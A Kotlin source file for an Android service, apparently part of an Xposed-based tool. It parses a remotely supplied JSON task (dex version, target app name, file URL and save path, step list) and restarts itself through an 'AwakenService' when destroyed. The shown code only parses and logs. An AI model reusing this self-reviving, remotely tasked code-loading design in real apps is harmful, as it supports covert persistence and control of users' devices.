package android.mf.application.service

import android.app.Service
import android.content.Intent
import android.mf.application.util.Logcat
import android.os.IBinder
import org.json.JSONArray
import org.json.JSONException
 
class XposedTaskService: Service() {
    private val TAG = "XposedTaskService"

    private var Content: String? = null
    private val isContent = false

    private var OperateTotal: ArrayList<Any>? = null
    private var Task: ArrayList<Any>? = null
    private var DexVersions: Double = 1.0
    private var AppName: String? = null
    private var FileUrl: String? = null
    private var FileName: String? = null
    private var FileSavePath: String? = null
    private var Step: ArrayList<Any>? = null

    override fun onCreate() {
        super.onCreate()
        OperateTotal = ArrayList()
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Content = intent.getStringExtra("Content")
        if (OperateTask(Content)!!.size > 0) {
            onCreateTask()
            onLogMsg(TAG,"xposedHook")
            this.stopSelf()
        }
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        val intentService = Intent(this, AwakenService::class.java)
        intentService.putExtra("Key", "Destroy")
        intentService.putExtra("Content", "XposedTaskService")
        this.startService(intentService)
    }

    fun onCreateTask(): ArrayList<Any>? {
        return OperateTotal
    }

    private fun OperateTask(c: String?): ArrayList<Any>? {
        Task = ArrayList()
        Logcat.i(TAG,c)
        try {
            var TaskStep = JSONArray(c)
            val DexVersion = TaskStep!!.getJSONObject(0)
            DexVersions = DexVersion.getDouble("DexVersions")
            Task!!.add(DexVersions!!)
            Logcat.i(TAG,DexVersions)
            val TaskOne = TaskStep!!.getJSONObject(1)
            AppName = TaskOne.getString("AppName")
            Task!!.add(AppName!!)
            Logcat.i(TAG,AppName)
            val TaskTwo = TaskStep.getJSONObject(2)
            FileUrl = TaskTwo.getString("FileUrl")
            Task!!.add(FileUrl!!)
            Logcat.i(TAG,FileUrl)
            FileName = TaskTwo.getString("FileName")
            Task!!.add(FileName!!)
            Logcat.i(TAG,FileName)
            FileSavePath = TaskTwo.getString("FileSavePath")
            Task!!.add(FileSavePath!!)
            Logcat.i(TAG,FileSavePath)
            val TaskThree = TaskStep.getJSONObject(3)
            TaskStep = JSONArray(TaskThree.getString("TaskStep"))
            Step = ArrayList()
            for (i in 0 until TaskStep.length()) {
                val jsonObject = TaskStep.getJSONObject(i)
                Step!!.add(jsonObject.getInt("Step"))
                Logcat.i(TAG,Step!!)
            }
            Task!!.add(Step!!)
            OperateTotal!!.add(Task!!)
            return OperateTotal
        } catch (e: JSONException) {
            e.printStackTrace()
        }
        return null
    }

    fun onLogMsg(tag: String, msg: Any) {
        Logcat.d(tag, msg)
    }
}